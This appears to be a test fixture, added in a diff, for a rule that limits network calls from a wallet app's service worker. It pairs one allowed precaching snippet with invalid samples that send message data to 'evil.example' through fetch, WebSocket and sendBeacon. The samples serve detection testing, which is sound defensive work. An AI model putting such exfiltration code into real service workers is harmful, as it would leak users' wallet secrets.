@@ -1,0 +1,31 @@
+id: wallet-network-service-worker
+valid:
+  - |
+    // The install-time precache fetch is the one allowed network call.
+    self.addEventListener("install", (event) => {
+      event.waitUntil((async () => {
+        const cache = await caches.open(CACHE_NAME);
+        for (const request of [
+          new Request("./", { cache: "reload" }),
+          new Request("./entropylab.html", { cache: "reload" }),
+        ]) {
+          const response = await fetch(request);
+          if (!response.ok) throw new Error(`Precache failed: ${response.status}`);
+          const clone = response.clone();
+          const marker = (await response.text()).match(/service-worker\.js\?v=([^"'\s]+)/)?.[1];
+          if (marker !== VERSION) throw new Error(`Precached document is revision ${marker ?? "unknown"}, not this worker's ${VERSION}.`);
+          await cache.put(request, clone);
+        }
+        await self.skipWaiting();
+      })());
+    });
+invalid:
+  - |
+    self.addEventListener("message", (e) => fetch("https://evil.example/", { method: "POST", body: e.data }));
+  - |
+    self.addEventListener("message", (e) => { const request = e.data; fetch(request); });
+  - |
+    self.addEventListener("install", (e) => { fetch("https://evil.example/x"); });
+  - |
+    new WebSocket("wss://evil.example");
+    navigator.sendBeacon("/x", data);
